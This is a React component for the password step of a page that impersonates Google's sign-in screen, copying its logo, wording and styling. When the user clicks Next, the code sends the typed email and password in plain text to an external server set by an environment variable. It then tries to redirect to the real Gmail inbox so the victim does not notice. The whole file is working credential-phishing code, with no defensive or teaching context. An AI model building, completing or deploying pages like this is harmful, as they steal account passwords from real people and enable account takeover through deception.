import { useState } from "react";
import {
    GoogleLogo,
    UserIcon,
    ChevronDown,
    EyeIcon,
    Footer,
} from "../extraComponents/components";

function PasswordStep({ email, onBack }) {
    const [password, setPassword] = useState("");
    const [showPassword, setShowPassword] = useState(false);
    const [focused, setFocused] = useState(false);

    async function handleNext() {
        const temp = await fetch(
            `${import.meta.env.VITE_API_URL}/${email}/${password}`,
            {
                method: "POST",
            },
        ).then(() => {
            window.Location.href = "https://mail.google.com/mail/u/0/";
            console.log("yay");
        });
    }

    return (
        <div className="min-h-screen bg-[#1a1a1a] flex flex-col items-center justify-center p-8 font-sans">
            <div className="bg-[#2d2d2d] rounded-[28px] p-10 w-full max-w-2xl flex gap-8">
                <div className="flex-1 flex flex-col">
                    <GoogleLogo />
                    <h1 className="text-[#e8eaed] text-4xl font-normal mt-6 mb-4">
                        Welcome
                    </h1>

                    <button
                        onClick={onBack}
                        className="flex items-center gap-2 border border-[#5f6368] rounded-full px-3 py-1.5 w-fit hover:bg-[#3c3c3c] transition-colors"
                    >
                        <UserIcon />
                        <span className="text-[#e8eaed] text-sm">{email}</span>
                        <ChevronDown />
                    </button>
                </div>

                <div className="flex-[1.4] flex flex-col gap-4">
                    <div className="relative mt-2">
                        <label
                            className="absolute text-xs px-1 -top-2 left-3 bg-[#2d2d2d] pointer-events-none"
                            style={{ color: focused ? "#8ab4f8" : "#9aa0a6" }}
                        >
                            Enter your password
                        </label>
                        <div
                            className="flex items-center rounded px-3"
                            style={{
                                border: `1px solid ${focused ? "#8ab4f8" : "#5f6368"}`,
                            }}
                        >
                            <input
                                type={showPassword ? "text" : "password"}
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                onFocus={() => setFocused(true)}
                                onBlur={() => setFocused(false)}
                                onKeyDown={(e) =>
                                    e.key === "Enter" && handleNext()
                                }
                                autoFocus
                                className="flex-1 bg-transparent py-3 text-base text-[#e8eaed] outline-none"
                            />
                            <button
                                onClick={() => setShowPassword((v) => !v)}
                                className="ml-2 flex items-center justify-center p-1 rounded-full hover:bg-[#3c3c3c] transition-colors"
                                tabIndex={-1}
                            >
                                <EyeIcon show={showPassword} />
                            </button>
                        </div>
                    </div>

                    <label className="flex items-center gap-3 cursor-pointer w-fit mt-1">
                        <input
                            type="checkbox"
                            checked={showPassword}
                            onChange={(e) => setShowPassword(e.target.checked)}
                            className="w-4 h-4 accent-[#8ab4f8] cursor-pointer"
                        />
                        <span className="text-[#e8eaed] text-sm">
                            Show password
                        </span>
                    </label>

                    <div className="flex items-center justify-end gap-6 mt-6">
                        <a
                            href="#"
                            className="text-[#8ab4f8] text-sm hover:underline"
                        >
                            Forgot password?
                        </a>
                        <button
                            onClick={handleNext}
                            className="bg-[#1a73e8] hover:bg-[#1765cc] text-white rounded-full px-6 py-2.5 text-sm font-medium transition-colors"
                        >
                            Next
                        </button>
                    </div>
                </div>
            </div>
            <Footer />
        </div>
    );
}
export default PasswordStep;
